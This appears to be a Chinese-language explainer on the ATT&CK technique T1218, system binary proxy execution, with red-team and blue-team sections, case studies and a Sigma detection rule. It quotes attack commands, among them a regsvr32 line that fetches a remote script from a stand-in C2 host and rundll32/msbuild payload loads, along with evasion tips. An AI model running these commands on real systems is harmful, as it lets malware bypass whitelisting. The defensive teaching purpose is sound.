# 系统二进制代理执行 (T1218)

## 一句话通俗理解

> **借着微软签名的合法程序"外壳"来运行恶意代码，让安全软件以为是正常系统在运行**

## 30秒速查卡

| 维度 | 你需要知道的 |
|------|-------------|
| 这是什么？ | 利用系统签名二进制文件作为代理执行恶意payload |
| 为什么危险？ | 绕过应用白名单和代码签名验证 |
| 谁需要关心？ | 安全运维团队、系统管理员、EDR管理员 |
| 你的第一步防御 | 监控签名工具加载非系统DLL的行为 |
| 如果只做一件事 | 部署Sysmon监控rundll32和regsvr32的命令行参数 |

## 难度等级

⭐⭐ 中级 - 需要Windows系统工具和代码签名机制知识

## 前置知识检查

**读这个文件需要什么？**

- [ ] Windows代码签名机制（Authenticode）
- [ ] DLL加载和COM组件原理
- [ ] 应用白名单（AppLocker/WDAC）工作原理

## 技术描述

### 通俗解释

安全软件检查程序时会看"身份证"——也就是数字签名。微软自带的工具都有微软签名，安全软件自然信任它们。攻击者就想了个办法：我不直接运行没签名的恶意程序，而是让有签名的系统工具去"帮忙"运行我的恶意代码。这就像犯罪分子不自己运货，而是把毒品藏在邮政快递里——警察检查时看到是邮政的车就放行了。

### 过渡段

简单来说，很多Windows系统工具具有加载和执行外部代码的能力。由于这些工具本身有微软签名，安全软件通常会放行。攻击者利用这一点，通过系统工具作为"代理"来执行恶意payload。

### 技术原理

系统二进制代理执行的核心机制：
1. **rundll32.exe**：加载任意DLL并调用其导出函数
2. **regsvr32.exe**：通过/s /u /i参数执行远程SCT脚本
3. **mshta.exe**：执行HTA文件中的脚本代码
4. **wmic.exe**：通过/process调用创建远程进程
5. **installutil.exe**：.NET安装工具，可执行嵌入式代码
6. **msbuild.exe**：构建工具，可执行内联C#任务
7. **regasm.exe/regsvcs.exe**：.NET程序集注册工具，可执行任意代码

### 用途与影响

系统二进制代理执行是绕过应用白名单最常用的技术之一。由于使用的是合法签名工具，传统基于签名和白名单的防御几乎无法阻止。被APT29、FIN7、Conti等组织广泛使用。

## 子技术列表

| 子技术ID | 名称 | 说明 |
|----------|------|------|
| T1218.001 | Compiled HTML File | 编译的HTML文件 |
| T1218.002 | Control Panel | 控制面板 |
| T1218.003 | CMSTP | 连接管理器配置文件 |
| T1218.004 | InstallUtil | .NET安装工具 |
| T1218.005 | Mshta | MSHTA执行 |
| T1218.007 | Regsvr32 | Regsvr32执行 |
| T1218.010 | Regsvcs/Regasm | .NET程序集注册 |
| T1218.011 | Rundll32 | Rundll32执行 |
| T1218.012 | Verclsid | Verclsid执行 |

## 攻击流程

```mermaid
flowchart LR
    A[分析目标白名单策略] --> B[选择签名代理工具]
    B --> C[准备恶意payload]
    C --> D[通过代理工具执行]
    D --> E[白名单放行]
    E --> F[payload在签名进程内执行]
    F --> G[绕过安全检测]
```

### 步骤详解
1. 攻击者分析目标的应用白名单策略，找出允许执行的签名工具
2. 选择合适的代理工具（如rundll32未被AppLocker限制）
3. 准备恶意payload（DLL、HTA、SCT脚本等）
4. 通过代理工具加载payload：`rundll32.exe C:\temp\evil.dll,EntryPoint`
5. AppLocker看到的是rundll32（签名工具），放行执行
6. payload在rundll32进程内执行，继承签名进程的信任
7. 安全软件的进程监控可能也不会拦截签名进程的行为

## 真实案例

### 案例1：APT29使用regsvr32执行远程脚本（2020年）
- **时间**：2020年
- **目标**：政府机构
- **攻击组织**：APT29（Cozy Bear）
- **手法**：APT29使用`regsvr32.exe /s /u /i:https://c2-server/payload.sct scrobj.dll`来执行远程SCT脚本。这个命令利用了regsvr32的scriptlet功能，从远程服务器下载并执行COM脚本组件。由于regsvr32有微软签名且在AppLocker默认白名单中，该操作未被拦截。SCT脚本中包含VBScript代码，用于下载和执行Cobalt Strike beacon。整个过程没有调用powershell.exe或cmd.exe，完全利用合法系统工具完成
- **影响**：成功绕过目标环境的应用白名单和EDR检测
- **参考链接**：Mandiant SUNBURST分析报告

### 案例2：FIN7使用rundll32加载后门DLL（2018-2020年）
- **时间**：2018-2020年
- **目标**：零售和餐饮企业
- **攻击组织**：FIN7
- **手法**：FIN7将后门代码编译为DLL文件，伪装成合法的系统组件（如名为"System.Net.dll"），放置在非系统目录。然后使用`rundll32.exe C:\ProgramData\System.Net.dll,StartW`来执行后门。后门在rundll32进程内运行，通过该进程发起HTTPS连接与C2服务器通信。由于rundll32是系统签名工具，安全软件不会拦截其网络行为
- **影响**：长期潜伏在多个零售商网络中，窃取大量信用卡数据
- **参考链接**：Trellix FIN7深度分析

### 案例3：Lazarus使用msbuild执行内联C#（2021年）
- **时间**：2021年
- **目标**：金融机构和加密货币公司
- **攻击组织**：Lazarus Group（朝鲜APT）
- **手法**：Lazarus使用MSBuild执行包含内联C#任务的XML项目文件。`msbuild.exe C:\temp\payload.csproj`会编译并执行XML中嵌入的C#代码。由于msbuild是Visual Studio/SDK自带的签名工具，通常不在安全软件的监控范围内。C#代码加载后门模块，建立与C2服务器的加密通信通道
- **影响**：成功绕过多个目标的端点防护
- **参考链接**：Kaspersky Lazarus报告

## 红队视角

### 实战技巧
- payload DLL命名伪装为系统组件（如"version.dll"）
- 使用rundll32的序号调用（`rundll32.dll,#1`）避免函数名暴露
- regsvr32的scrobj.dll方式可完全fileless执行
- msbuild的内联C#任务可避免磁盘写入payload

### 常用工具
| 工具 | 类型 | 特点 |
|------|------|------|
| rundll32 | 系统工具 | 最常用的DLL加载代理 |
| regsvr32 | 系统工具 | 远程SCT脚本执行 |
| mshta | 系统工具 | HTA脚本执行 |
| msbuild | SDK工具 | 内联C#编译执行 |
| installutil | .NET工具 | .NET程序集执行 |
| regasm | .NET工具 | 程序集注册时代码执行 |

## 蓝队视角

### 检测要点
- 监控rundll32加载非系统目录DLL的行为
- 检测regsvr32执行远程URL脚本
- 监控msbuild从非标准目录执行
- 检测签名工具创建可疑子进程

### 监控建议
- 部署Sysmon Event ID 1和7（进程创建和镜像加载）
- 配置ASR规则阻止Office应用生成子进程
- 监控rundll32/regsvr32/mshta的网络连接

## 避坑指南

- 不要仅依赖AppLocker默认规则——rundll32和regsvr32通常在默认白名单中
- ASR规则可以补充AppLocker的不足
- 签名工具加载的DLL也需要监控——payload在签名进程内执行

## 检测建议

### 网络层
- 监控rundll32/regsvr32/mshta发起的网络连接
- 检测regsvr32到外部URL的HTTP请求

### 主机层
- **用人话说**：系统会记录哪些程序加载了什么DLL，重点关注签名工具加载了非系统目录的文件
```yaml
# Sysmon监控配置
Event ID: 1   # 进程创建（检查命令行）
Event ID: 7   # 镜像加载（检查DLL路径）
Event ID: 3   # 网络连接（检查签名工具联网）
```

### 应用层
```yaml
# Sigma规则：检测签名工具代理执行
title: 检测系统二进制代理执行
status: experimental
description: 监控rundll32/regsvr32/mshta的可疑使用
logsource:
    category: process_creation
    product: windows
detection:
    selection_rundll32:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains:
            - 'C:\Users\'
            - 'C:\Temp\'
            - 'C:\ProgramData\'
    selection_regsvr32:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains:
            - '/i:http'
            - '/i:https'
            - 'scrobj.dll'
    condition: selection_rundll32 or selection_regsvr32
level: high
```

## 缓解措施

### 优先级1（必须实施）
- 部署ASR规则阻止签名工具的异常子进程创建
- 监控rundll32/regsvr32/mshta的命令行参数和网络行为
- 限制这些工具从用户目录加载文件

### 优先级2（推荐实施）
- 使用WDAC细化策略，限制DLL加载路径
- 配置Sysmon镜像加载监控
- 部署EDR行为分析检测异常代理执行模式

### 优先级3（长期规划）
- 建立签名工具使用基线，偏离时告警
- 实施零信任进程行为监控

## 动手实验

### 实验1：使用rundll32加载DLL
```bash
# 预期输出：成功调用DLL中的导出函数
rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL
# 应弹出控制面板
```

### 实验2：检测rundll32异常加载
```powershell
# 预期输出：显示rundll32加载的所有非系统DLL
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 7 -and $_.Message -match "rundll32"}
```

## 术语解释

| 术语 | 说明 |
|------|------|
| Authenticode | 微软代码签名技术，验证可执行文件来源 |
| AppLocker | Windows应用白名单功能 |
| WDAC | Windows Defender Application Control |
| ASR | Attack Surface Reduction，攻击面缩减 |
| SCT | Scriptlet文件，可被regsvr32执行的COM脚本组件 |

## 参考资料

### 📚 深入了解
- [MITRE ATT&CK T1218](https://attack.mitre.org/techniques/T1218/)
- [LOLBAS项目](https://lolbas-project.github.io/)

### 📰 真实攻击
- [Mandiant SUNBURST分析](https://www.mandiant.com/)
- [CISA FIN7报告](https://www.cisa.gov/)

### 🔧 动手试试
- [LOLBAS rundll32用法](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
- [ASR规则配置指南](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction)
